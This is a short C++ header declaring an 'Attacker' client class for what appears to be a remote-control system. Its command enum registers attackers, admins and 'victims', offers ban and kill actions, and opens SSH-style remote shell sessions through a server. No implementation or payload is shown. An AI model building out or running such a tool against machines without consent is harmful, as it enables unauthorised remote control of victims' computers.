#include <SFML/Network.hpp>
#include <iostream>
#include <thread>
#include <windows.h>

class Attacker {
public:
	Attacker(std::string inHId);
	int update();

private:
	void receiveTcp();

	void connectServer(std::stringstream& ss, bool pw);

	bool handleCmd(std::string& s);
	void handlePacket(sf::Packet& p);
	void updateList(sf::Packet& p);

	inline void printErr(std::string e) {
		std::cerr << "\033[31m" << e << "\033[0m";
		consoleMemory << "\033[31m" << e << "\033[0m";
	}
	inline void printMsg(std::string s) {
		std::cout << s;
		consoleMemory << s;
	}

	std::thread* receiveTcpThread = nullptr;
	sf::TcpSocket server;
	sf::IpAddress serverIp = sf::IpAddress(0, 0, 0, 0);

	//uint8_t
	enum Cmd {
		UNDEFINED = 0,
		REGISTER_ADMIN = 1,
		REGISTER_ATTACKER = 2,
		REGISTER_VICTIM = 3,
		LIST_UPDATE = 4,
		CHANGE_NAME = 5,	//admin
		BAN_HID = 6,		//admin
		UNBAN_HID = 7,		//admin
		KILL = 8,			//admin
		START_SSH = 9,
		END_SSH = 10,
		SSH_DATA = 11
	};
	uint16_t requestId = 1;
	//response id has been stripped
	std::vector<sf::Packet> packetsToProcess;
	std::map<uint16_t, sf::Packet> responsesToProcess;

	std::string myHId = "";
	int16_t myId = 0;
	std::string cmdBuffer = "";

	bool wasDisconnected = false;
	std::stringstream consoleMemory, listMemory;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	//does the server know about your existance?
	bool isInitialized = false;
	//do you have admin privileges?
	bool isAdmin = false;
	bool isSshActive = false;
};